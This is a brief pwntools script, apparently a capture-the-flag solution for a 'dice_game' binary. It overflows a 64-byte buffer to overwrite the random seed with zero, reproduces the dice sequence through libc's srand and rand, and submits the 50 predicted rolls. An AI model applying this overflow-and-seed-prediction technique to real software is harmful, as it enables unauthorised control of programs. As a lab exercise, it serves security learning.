from pwn import *
from ctypes import *
p=process('./dice_game')
#r=remote()
context(arch='amd64',os='linux',log_level='debug',endian='little')
elf=ELF('./dice_game')
libc=cdll.LoadLibrary('libc.so.6')
payload1='a'*0x40+p64(0)
libc.srand(0)
res=[]
def dice_game():
	for i in range(50):
		res.append(libc.rand()%6+1)
	print res
p.sendline(payload1)
dice_game()
for point in res:
	p.sendline(str(point))
#flag=p.recvline()
#print flag
p.interactive()

	
